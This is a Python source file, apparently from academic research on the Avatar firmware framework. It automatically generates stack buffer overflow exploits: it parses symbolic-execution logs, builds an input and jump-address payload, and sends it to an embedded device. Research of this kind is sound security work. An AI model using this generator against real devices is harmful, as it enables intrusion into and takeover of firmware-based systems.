"""
Stack Buffer Overflow Generator. Modified 22 August 2015.
@author Matthew Ruffell <msr50@uclive.ac.nz>
"""

import logging
import re

from avatar.exploitgenerators.exploitgenerator import ExploitGenerator
from avatar.communicators.communicator import Communicator

log = logging.getLogger(__name__)

class BufferOverflowGenerator (ExploitGenerator):
    """ Implements automatic exploit generation for traditional stack buffer
        overflow exploits. Constructs exploits based on outputs from the 
        symbolic executor and also contains a deployment mechanism.
    """
    
    def __init__ (self):
        """ Initialisation """
        self.input = None
        self.payload = None
        self.exploit = None
    
    def construct_input (self, path):
        """ Constructs an input such that the firmware would be placed in a 
            vulnerable state. The input is found from the path information
            the symbolic executor outputs. """
        # Logfile will contain outputs similar to
        # 7 [State 0] Forking state 0 at pc = 0x0000xxxx
        #     state 0 with condition (Slt (ReadLSB w32 0x0 v0_x_0)
        #      (w32 0xb))
        #     state 1 with condition (Not (Slt (ReadLSB w32 0x0 v0_x_0)
        #      (w32 0xb)))
        # [ArbitraryExec]: Controlled value, input range from X to X
        # [ArbitraryExec]: Will branch to a symbolic destination at the end of 0x0000xxxx 
        # Symbolic jump target at instruction 0x0000xxxx
        f = open(path, 'r')
        text = f.read()
        crafted_input = ""
        # Find the start and end of the inputs which place the firmware
        # into vulnerable state. Then search between indexes for inputs
        index_exec_location = text.find("Controlled value, ")
        index_exec_inputs = text.rfind("with condition", 0, index_exec_location)
        all_inputs = re.findall("0x.", text[index_exec_inputs:index_exec_location])
        for item in all_inputs:
            # Note ARM is little endian so 0xabcd is represented as dcba
            crafted_input = item[2:] + crafted_input
        f.close()
        self.input = crafted_input
        
        
    def construct_payload (self, path, custom_payload):
        """ Constructs a payload from infromation gained from the symbolic 
            executor. """
        # Arbitary exec plugin outputs the following:
        # '[ArbitraryExec]: Controlled value, input range from X to X
        # '[ArbitraryExec]: Will branch to a symbolic destination at the end of 
        #   0x0000xxxx \n Symbolic jump target at instruction 0x0000xxxx'
        # We extract the jump address and concatenate it with specified payload
        f = open(path, 'r')
        text = f.read()
        address_index = text.find("Symbolic jump target at instruction ")
        # Extract the full address in ascii format
        address_full = text[address_index + 38: address_index + 46]
        # Convert the acii address to the real representation ie
        # 0x00000bcc -> 0x00 0x00 0x0b 0xcc
        address = bytearray.fromhex(address_full).decode()
        f.close()
        f = open(custom_payload)
        payload = f.read ().strip ()
        f.close()
        # Note payload will probably contain unprintable bytes
        # This is fine as Communicator sends as raw byts over wire
        self.payload = payload + address
        
    def set_input (self, custom_input):
        """ Explicity set input to reach a vulnerable state """
        self.input = custom_input
    
    def set_payload (self, custom_payload):
        """ Explicity set a payload to exploit a vulnerable state """
        self.payload = custom_payload
        
    def construct_exploit (self):
        """ Construct an exploit by concatenating crafted input and payload """
        # Since the crafted input places the firmware into a vulnerable state,
        # i.e. at a point where we can load a buffer with control flow data
        # all we need to do is simply concatenate the input with payload
        self.exploit = self.input + self.payload
    
    def deploy_exploit (self, communicator):
        """ Send the exploit to the target device through a communicator """
        self.construct_exploit ()
        print ("AVATAR: Sending buffer overflow to device: " + self.exploit)
        communicator.send (self.exploit)
   
    def get_exploit (self):
        """ Return the constructed exploit to it can be used or saved """
        return self.input + self.payload
